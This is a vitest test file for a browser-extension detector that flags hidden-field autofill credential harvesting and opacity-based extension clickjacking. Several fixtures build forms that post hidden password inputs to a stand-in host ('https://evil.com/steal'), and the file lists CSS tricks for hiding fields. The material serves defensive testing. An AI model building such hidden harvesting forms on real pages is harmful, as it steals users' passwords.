/**
 * extension/__tests__/autofill_guard.test.js
 *
 * Tests for AutofillGuard — autofill credential harvesting detector.
 * Covers both attack vectors:
 *   Vector 1: Hidden field harvest (Kuosmanen 2017 / Princeton 2018)
 *   Vector 2: DOM-based Extension Clickjacking (Toth 2025)
 *
 * jsdom limitations:
 *   - getComputedStyle() does not compute inherited/cascaded styles.
 *     Tests set element.style directly.
 *   - getBoundingClientRect() returns all zeroes by default.
 *     Offscreen detection falls back to inline style position checks.
 *   - Popover API (:popover-open) may not be supported.
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';

// Mock chrome APIs before importing the module
const mockSendMessage = vi.fn();
vi.stubGlobal('chrome', {
  runtime: {
    id: 'test-extension-id',
    sendMessage: mockSendMessage,
  },
});

import '../content/autofill_guard.js';
const { getCredentialFields, getFieldVisibilitySignals, isLikelyFalsePositive, checkClickjackingSignals, calculateAutofillRiskScore, disableHiddenCredentialFields, restoreClickjackedPage, injectAutofillWarningBanner, runAudit } = globalThis.__phishopsExports['autofill_guard'];

beforeEach(() => {
  document.body.innerHTML = '';
  document.body.style.cssText = '';
  document.documentElement.style.cssText = '';
  document.getElementById('phishops-autofill-warning')?.remove();
  vi.clearAllMocks();
});

// =========================================================================
// getCredentialFields
// =========================================================================

describe('getCredentialFields', () => {
  it('finds password fields', () => {
    document.body.innerHTML = '<input type="password"><input type="text">';
    expect(getCredentialFields()).toHaveLength(1);
  });

  it('finds autocomplete=current-password fields', () => {
    document.body.innerHTML = '<input type="text" autocomplete="current-password">';
    expect(getCredentialFields()).toHaveLength(1);
  });

  it('returns empty for pages with no credential fields', () => {
    document.body.innerHTML = '<input type="text"><input type="email">';
    expect(getCredentialFields()).toHaveLength(0);
  });
});

// =========================================================================
// getFieldVisibilitySignals — Vector 1 hidden field checks
// =========================================================================

describe('getFieldVisibilitySignals', () => {
  it('detects display:none on field', () => {
    document.body.innerHTML = '<input type="password" style="display:none">';
    const field = document.querySelector('input[type="password"]');
    const signals = getFieldVisibilitySignals(field);
    expect(signals.some(s => s.id === 'hidden_field:display_none')).toBe(true);
  });

  it('detects display:none on ancestor', () => {
    document.body.innerHTML = '<div style="display:none"><input type="password"></div>';
    const field = document.querySelector('input[type="password"]');
    const signals = getFieldVisibilitySignals(field);
    expect(signals.some(s => s.id === 'hidden_field:display_none')).toBe(true);
  });

  it('detects visibility:hidden on field', () => {
    document.body.innerHTML = '<input type="password" style="visibility:hidden">';
    const field = document.querySelector('input[type="password"]');
    const signals = getFieldVisibilitySignals(field);
    expect(signals.some(s => s.id === 'hidden_field:visibility_hidden')).toBe(true);
  });

  it('detects opacity:0 on field', () => {
    document.body.innerHTML = '<input type="password" style="opacity:0">';
    const field = document.querySelector('input[type="password"]');
    const signals = getFieldVisibilitySignals(field);
    expect(signals.some(s => s.id === 'hidden_field:opacity_zero')).toBe(true);
  });

  it('detects opacity:0 on ancestor', () => {
    document.body.innerHTML = '<div style="opacity:0"><input type="password"></div>';
    const field = document.querySelector('input[type="password"]');
    const signals = getFieldVisibilitySignals(field);
    expect(signals.some(s => s.id === 'hidden_field:opacity_zero')).toBe(true);
  });

  it('detects clip-path:inset(100%) on field', () => {
    document.body.innerHTML = '<input type="password" style="clip-path:inset(100%)">';
    const field = document.querySelector('input[type="password"]');
    const signals = getFieldVisibilitySignals(field);
    expect(signals.some(s => s.id === 'hidden_field:clip_hidden')).toBe(true);
  });

  it('detects transform:scale(0) on field', () => {
    document.body.innerHTML = '<input type="password" style="transform:scale(0)">';
    const field = document.querySelector('input[type="password"]');
    const signals = getFieldVisibilitySignals(field);
    expect(signals.some(s => s.id === 'hidden_field:transform_zero')).toBe(true);
  });

  it('detects off-screen via inline style position', () => {
    document.body.innerHTML = '<input type="password" style="position:absolute; left:-9999px">';
    const field = document.querySelector('input[type="password"]');
    const signals = getFieldVisibilitySignals(field);
    expect(signals.some(s => s.id === 'hidden_field:offscreen')).toBe(true);
  });

  it('returns no signals for a visible field', () => {
    document.body.innerHTML = '<input type="password">';
    const field = document.querySelector('input[type="password"]');
    const signals = getFieldVisibilitySignals(field);
    // In jsdom, getBoundingClientRect returns zeroes so zero_size may fire.
    // Filter to only hiding-intent signals.
    const intentSignals = signals.filter(s =>
      !s.id.includes('zero_size') // zero_size is a jsdom artifact
    );
    expect(intentSignals).toHaveLength(0);
  });
});

// =========================================================================
// isLikelyFalsePositive — false positive suppression
// =========================================================================

describe('isLikelyFalsePositive', () => {
  it('suppresses when adjacent show/hide toggle button exists', () => {
    document.body.innerHTML = `
      <div>
        <input type="password" style="display:none">
        <button>Show</button>
      </div>
    `;
    const field = document.querySelector('input[type="password"]');
    expect(isLikelyFalsePositive(field, null)).toBe(true);
  });

  it('suppresses when adjacent eye icon button exists', () => {
    document.body.innerHTML = `
      <div>
        <input type="password" style="display:none">
        <span role="button">Toggle eye</span>
      </div>
    `;
    const field = document.querySelector('input[type="password"]');
    expect(isLikelyFalsePositive(field, null)).toBe(true);
  });

  it('suppresses field in inactive multi-step form step', () => {
    document.body.innerHTML = `
      <form>
        <div data-step="2" style="display:none">
          <input type="password">
        </div>
      </form>
    `;
    const field = document.querySelector('input[type="password"]');
    expect(isLikelyFalsePositive(field, field.closest('form'))).toBe(true);
  });

  it('does NOT suppress field in active step of multi-step form', () => {
    document.body.innerHTML = `
      <form>
        <div data-step="1">
          <input type="password" style="display:none">
        </div>
      </form>
    `;
    const field = document.querySelector('input[type="password"]');
    // Step container is visible, but field itself is hidden — not a false positive
    expect(isLikelyFalsePositive(field, field.closest('form'))).toBe(false);
  });

  it('suppresses field in OAuth redirect form', () => {
    document.body.innerHTML = `
      <form action="https://login.microsoftonline.com/oauth2/authorize">
        <input type="password" style="display:none">
      </form>
    `;
    const field = document.querySelector('input[type="password"]');
    const form = field.closest('form');
    expect(isLikelyFalsePositive(field, form)).toBe(true);
  });

  it('does NOT suppress hidden field with no suppression patterns', () => {
    document.body.innerHTML = `
      <form action="https://evil.com/steal">
        <input type="password" style="display:none">
      </form>
    `;
    const field = document.querySelector('input[type="password"]');
    expect(isLikelyFalsePositive(field, field.closest('form'))).toBe(false);
  });
});

// =========================================================================
// checkClickjackingSignals — Vector 2 page-level checks
// =========================================================================

describe('checkClickjackingSignals', () => {
  it('detects body opacity:0 when credential fields exist', () => {
    document.body.innerHTML = '<input type="password">';
    document.body.style.opacity = '0';
    const signals = checkClickjackingSignals();
    expect(signals.some(s => s.id === 'clickjack:body_opacity_zero')).toBe(true);
  });

  it('detects html opacity:0 when credential fields exist', () => {
    document.body.innerHTML = '<input type="password">';
    document.documentElement.style.opacity = '0';
    const signals = checkClickjackingSignals();
    expect(signals.some(s => s.id === 'clickjack:body_opacity_zero')).toBe(true);
  });

  it('detects body transform:scale(0)', () => {
    document.body.innerHTML = '<input type="password">';
    document.body.style.transform = 'scale(0)';
    const signals = checkClickjackingSignals();
    expect(signals.some(s => s.id === 'clickjack:transform_scale_zero')).toBe(true);
  });

  it('returns no signals when no credential fields exist', () => {
    document.body.innerHTML = '<input type="text">';
    document.body.style.opacity = '0';
    const signals = checkClickjackingSignals();
    expect(signals).toHaveLength(0);
  });

  it('returns no signals for a normal page with visible body', () => {
    document.body.innerHTML = '<input type="password">';
    document.body.style.opacity = '1';
    const signals = checkClickjackingSignals();
    // Filter out any jsdom artifacts
    const intentSignals = signals.filter(s => s.id.startsWith('clickjack:'));
    expect(intentSignals).toHaveLength(0);
  });
});

// =========================================================================
// calculateAutofillRiskScore
// =========================================================================

describe('calculateAutofillRiskScore', () => {
  it('returns 0.0 when no signals are present', () => {
    const result = calculateAutofillRiskScore({
      fieldSignals: [],
      exfilSignals: [],
      clickjackSignals: [],
    });
    expect(result.riskScore).toBe(0);
    expect(result.signalList).toHaveLength(0);
  });

  it('scores 0.40 for a single display:none hidden field', () => {
    const result = calculateAutofillRiskScore({
      fieldSignals: [{ id: 'hidden_field:display_none', weight: 0.40 }],
      exfilSignals: [],
      clickjackSignals: [],
    });
    expect(result.riskScore).toBe(0.40);
    expect(result.vector).toBe('hidden_field_harvest');
  });

  it('scores hidden_field + cross_origin = 0.65 (above alert threshold)', () => {
    const result = calculateAutofillRiskScore({
      fieldSignals: [{ id: 'hidden_field:display_none', weight: 0.40 }],
      exfilSignals: [{ id: 'exfil:cross_origin_action', weight: 0.25 }],
      clickjackSignals: [],
    });
    expect(result.riskScore).toBe(0.65);
  });

  it('scores 0.50 for clickjack:body_opacity_zero alone (at alert threshold)', () => {
    const result = calculateAutofillRiskScore({
      fieldSignals: [],
      exfilSignals: [],
      clickjackSignals: [{ id: 'clickjack:body_opacity_zero', weight: 0.50 }],
    });
    expect(result.riskScore).toBe(0.50);
    expect(result.vector).toBe('extension_clickjacking');
  });

  it('uses max of two vectors, not sum', () => {
    const result = calculateAutofillRiskScore({
      fieldSignals: [{ id: 'hidden_field:display_none', weight: 0.40 }],
      exfilSignals: [],
      clickjackSignals: [{ id: 'clickjack:body_opacity_zero', weight: 0.50 }],
    });
    // max(0.40, 0.50) = 0.50, not 0.90
    expect(result.riskScore).toBe(0.50);
    expect(result.vector).toBe('extension_clickjacking');
  });

  it('caps score at 1.0', () => {
    const result = calculateAutofillRiskScore({
      fieldSignals: [
        { id: 'hidden_field:display_none', weight: 0.40 },
        { id: 'hidden_field:opacity_zero', weight: 0.35 },
      ],
      exfilSignals: [
        { id: 'exfil:cross_origin_action', weight: 0.25 },
        { id: 'exfil:hidden_field_count', weight: 0.15 },
      ],
      clickjackSignals: [],
    });
    expect(result.riskScore).toBeLessThanOrEqual(1.0);
  });
});

// =========================================================================
// disableHiddenCredentialFields
// =========================================================================

describe('disableHiddenCredentialFields', () => {
  it('disables fields, clears values, and sets autocomplete off', () => {
    document.body.innerHTML = `
      <input type="password" value="secretpass">
      <input type="password" value="confirm">
    `;
    const fields = [...document.querySelectorAll('input[type="password"]')];
    disableHiddenCredentialFields(fields, 0.80);

    fields.forEach(field => {
      expect(field.disabled).toBe(true);
      expect(field.value).toBe('');
      expect(field.autocomplete).toBe('off');
    });
  });

  it('sets warning placeholder text', () => {
    document.body.innerHTML = '<input type="password">';
    const fields = [...document.querySelectorAll('input[type="password"]')];
    disableHiddenCredentialFields(fields, 0.80);
    expect(fields[0].placeholder).toContain('Blocked by PhishOps');
  });
});

// =========================================================================
// restoreClickjackedPage
// =========================================================================

describe('restoreClickjackedPage', () => {
  it('restores body opacity to 1', () => {
    document.body.style.opacity = '0';
    restoreClickjackedPage(0.80);
    expect(document.body.style.opacity).toBe('1');
  });

  it('restores html opacity to 1', () => {
    document.documentElement.style.opacity = '0';
    restoreClickjackedPage(0.80);
    expect(document.documentElement.style.opacity).toBe('1');
  });
});

// =========================================================================
// injectAutofillWarningBanner
// =========================================================================

describe('injectAutofillWarningBanner', () => {
  it('injects banner with role=alert', () => {
    injectAutofillWarningBanner(0.75, 'hidden_field_harvest', ['hidden_field:display_none']);
    const banner = document.getElementById('phishops-autofill-warning');
    expect(banner).not.toBeNull();
    expect(banner.getAttribute('role')).toBe('alert');
  });

  it('is idempotent — does not inject twice', () => {
    injectAutofillWarningBanner(0.75, 'hidden_field_harvest', ['test']);
    injectAutofillWarningBanner(0.75, 'hidden_field_harvest', ['test']);
    const banners = document.querySelectorAll('#phishops-autofill-warning');
    expect(banners).toHaveLength(1);
  });

  it('shows clickjacking title for extension_clickjacking vector', () => {
    injectAutofillWarningBanner(0.50, 'extension_clickjacking', ['clickjack:body_opacity_zero']);
    const banner = document.getElementById('phishops-autofill-warning');
    expect(banner.textContent).toContain('Extension Clickjacking');
  });

  it('shows hidden field title for hidden_field_harvest vector', () => {
    injectAutofillWarningBanner(0.70, 'hidden_field_harvest', ['hidden_field:display_none']);
    const banner = document.getElementById('phishops-autofill-warning');
    expect(banner.textContent).toContain('hidden credential harvest');
  });

  it('contains risk score in banner text', () => {
    injectAutofillWarningBanner(0.75, 'hidden_field_harvest', ['hidden_field:display_none']);
    const banner = document.getElementById('phishops-autofill-warning');
    expect(banner.textContent).toContain('0.75');
  });

  it('dismiss button removes banner', () => {
    injectAutofillWarningBanner(0.75, 'hidden_field_harvest', ['test']);
    const dismissBtn = document.getElementById('phishops-autofill-dismiss');
    dismissBtn.click();
    expect(document.getElementById('phishops-autofill-warning')).toBeNull();
  });
});

// =========================================================================
// runAudit — integration tests
// =========================================================================

describe('runAudit', () => {
  it('returns detected:false for a clean page with no credential fields', () => {
    document.body.innerHTML = '<input type="text">';
    const result = runAudit();
    expect(result.detected).toBe(false);
    expect(result.riskScore).toBe(0);
  });

  it('returns detected:false for a page with visible password field', () => {
    document.body.innerHTML = '<form><input type="password"></form>';
    const result = runAudit();
    // In jsdom, visible fields may still trigger zero_size due to layout not being computed.
    // But the risk score should be below alert threshold or suppressed.
    expect(result.riskScore).toBeLessThan(0.50);
  });

  it('detects hidden password field with display:none + cross-origin form', () => {
    document.body.innerHTML = `
      <form action="https://evil.com/steal">
        <input type="email" value="victim@test.com">
        <input type="password" style="display:none" value="password123">
      </form>
    `;
    const result = runAudit();
    expect(result.detected).toBe(true);
    expect(result.riskScore).toBeGreaterThanOrEqual(0.50);
    expect(result.signals).toContain('hidden_field:display_none');
  });

  it('detects body opacity clickjacking with credential fields', () => {
    document.body.innerHTML = '<input type="password">';
    document.body.style.opacity = '0';
    const result = runAudit();
    expect(result.detected).toBe(true);
    // Note: In jsdom, getBoundingClientRect returns zeroes so the field also gets
    // zero_size signal (0.35). The clickjack signal is 0.50 which is higher,
    // BUT the hidden field may also accumulate opacity_zero (0.35) from body
    // ancestor walk. The key assertion is that the clickjack signal fired.
    expect(result.signals).toContain('clickjack:body_opacity_zero');
  });

  it('suppresses hidden field when show/hide toggle exists (false positive)', () => {
    document.body.innerHTML = `
      <div>
        <input type="password" style="display:none">
        <button>Show password</button>
      </div>
    `;
    const result = runAudit();
    // Should be suppressed — no detection
    expect(result.detected).toBe(false);
  });

  it('sends telemetry to background when detection occurs', () => {
    document.body.innerHTML = `
      <form action="https://evil.com/steal">
        <input type="password" style="display:none">
      </form>
    `;
    runAudit();
    // Check that sendMessage was called
    expect(mockSendMessage).toHaveBeenCalledWith(
      expect.objectContaining({
        type: 'AUTOFILLGUARD_EVENT',
        payload: expect.objectContaining({
          eventType: expect.stringMatching(/^AUTOFILL_/),
          riskScore: expect.any(Number),
        }),
      }),
    );
  });
});

// =========================================================================
// Form submit interception (unit-level)
// =========================================================================

describe('form submit behaviour', () => {
  it('runAudit disables hidden fields when risk >= disable threshold', () => {
    document.body.innerHTML = `
      <form action="https://evil.com/steal">
        <input type="password" style="display:none" value="stolen">
        <input type="password" style="visibility:hidden" value="stolen2">
      </form>
    `;
    const result = runAudit();
    // With display:none (0.40) + exfil cross-origin (0.25) + 2 hidden fields (0.15) = 0.80
    expect(result.riskScore).toBeGreaterThanOrEqual(0.70);

    // Verify fields were disabled
    const fields = document.querySelectorAll('input[type="password"]');
    const disabledFields = [...fields].filter(f => f.disabled);
    expect(disabledFields.length).toBeGreaterThan(0);
  });
});
